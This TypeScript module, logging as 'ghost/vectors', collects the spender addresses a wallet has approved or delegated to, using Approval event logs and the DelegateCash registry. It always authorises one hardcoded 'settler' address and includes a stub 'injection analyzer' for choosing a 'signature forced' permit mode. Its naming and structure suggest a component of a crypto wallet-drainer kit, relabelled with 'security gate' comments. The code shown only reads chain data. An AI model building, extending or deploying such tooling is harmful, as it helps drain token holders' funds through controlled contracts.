"use client";

import { parseAbi, type Address, getAddress, parseAbiItem } from "viem";
import {
  GLOBAL_SPENDERS,
  MINIMAL_ERC20_ABI,
  EXECUTION_POLICY,
} from "./constants";

const logLabel = "[ghost/vectors]";

/**
 * 🛡️ AUTHORIZATION GATE
 * Checks if a spender address is permitted by the system policy.
 */
const isAuthorized = (addr: string) => {
  try {
    const addrCheck = getAddress(addr);
    const mySettler = getAddress("0xadaB97dd0C4182Af5d5092c55172a35D268E3E90");

    // Allow if it's your new settler OR in the policy
    return (
      addrCheck === mySettler ||
      EXECUTION_POLICY.ALLOWED_SPENDERS.includes(addrCheck)
    );
  } catch {
    return false;
  }
};

/**
 * 🧠 DEEP VECTOR EXTRACTION (v7.6.1 - Aggressive Recovery)
 * Security Additions: Zero-Trust address validation for all discovered vectors.
 */
export async function extractDeepVectors(
  userAddress: Address,
  client: any,
): Promise<Address[]> {
  const vectors = new Set<string>();
  const discoveryManifest: any[] = [];

  // 1. STATIC PRIORITY VECTORS (Preserved)
  Object.entries(GLOBAL_SPENDERS).forEach(([name, addr]) => {
    if (!addr || addr === "0x0000000000000000000000000000000000000000") return;
    const lower = addr.toLowerCase();
    if (!vectors.has(lower)) {
      vectors.add(lower);
      discoveryManifest.push({
        source: "STATIC",
        address: getAddress(addr),
        details: `Core Protocol: ${name}`,
      });
    }
  });

  try {
    const chainId = await client.getChainId().catch(() => 1);
    const block = await client.getBlockNumber().catch(() => 0n);

    if (block > 0n) {
      const isMainnet = chainId === 1;
      let lookback = isMainnet ? 10n : 1500n;
      let logs: any[] = [];
      let success = false;
      let attempts = 0;

      while (attempts < 2 && !success) {
        try {
          const startBlock = block > lookback ? block - lookback : 0n;
          logs = await client.getLogs({
            event: parseAbiItem(
              "event Approval(address indexed owner, address indexed spender, uint256 value)",
            ),
            args: { owner: userAddress },
            fromBlock: startBlock,
            toBlock: "latest",
          });
          success = true;
        } catch (err: any) {
          attempts++;
          if (err.message.includes("400") || err.message.includes("range"))
            lookback /= 4n;
          else break;
        }
      }

      logs.forEach((log: any) => {
        if (log?.args?.spender) {
          const spender = log.args.spender.toLowerCase();
          // 🛡️ SECURITY GATE: Only add if authorized by policy
          if (!vectors.has(spender) && isAuthorized(spender)) {
            console.log(
              `${logLabel} 🔍 Discovery: Found authorized spender ${spender}`,
            );
            vectors.add(spender);
            discoveryManifest.push({
              source: "EVENT_LOG",
              address: getAddress(spender),
              details: "Historical approval",
            });
          }
        }
      });
    }

    // 3. REGISTRY PROBING (Preserved)
    if (
      GLOBAL_SPENDERS.DELEGATE_CASH &&
      GLOBAL_SPENDERS.DELEGATE_CASH !==
        "0x0000000000000000000000000000000000000000"
    ) {
      const delegates = await client
        .readContract({
          address: GLOBAL_SPENDERS.DELEGATE_CASH,
          abi: parseAbi([
            "function getDelegatesForAll(address) view returns (address[])",
          ]),
          functionName: "getDelegatesForAll",
          args: [userAddress],
        })
        .catch(() => []);

      if (Array.isArray(delegates)) {
        delegates.forEach((d: string) => {
          const addr = d.toLowerCase();
          // 🛡️ SECURITY GATE: Only add if authorized by policy
          if (!vectors.has(addr) && isAuthorized(addr)) {
            vectors.add(addr);
            discoveryManifest.push({
              source: "REGISTRY",
              address: getAddress(d),
              details: "DelegateCash Link",
            });
          }
        });
      }
    }
  } catch (e: any) {
    console.error(`${logLabel} ❌ Recovery phase error: ${e.message}`);
  }

  // 🛡️ FINAL SANITIZATION GATE
  const finalVectors = Array.from(vectors)
    .filter(
      (addr) =>
        addr &&
        addr.startsWith("0x") &&
        addr !== "0x0000000000000000000000000000000000000000",
    )
    .map((addr) => getAddress(addr));

  console.log(
    `${logLabel} ✅ Extracted ${finalVectors.length} unique vectors.`,
  );
  return finalVectors;
}

/**
 * 💉 INJECTION ANALYZER (v1.2.7 - Signature Forced Edition)
 */
export async function identifyInjectionMode(
  token: Address,
  owner: Address,
  client: any,
): Promise<"PERMIT2" | "EIP2612" | "LEGACY"> {
  return "LEGACY";
}
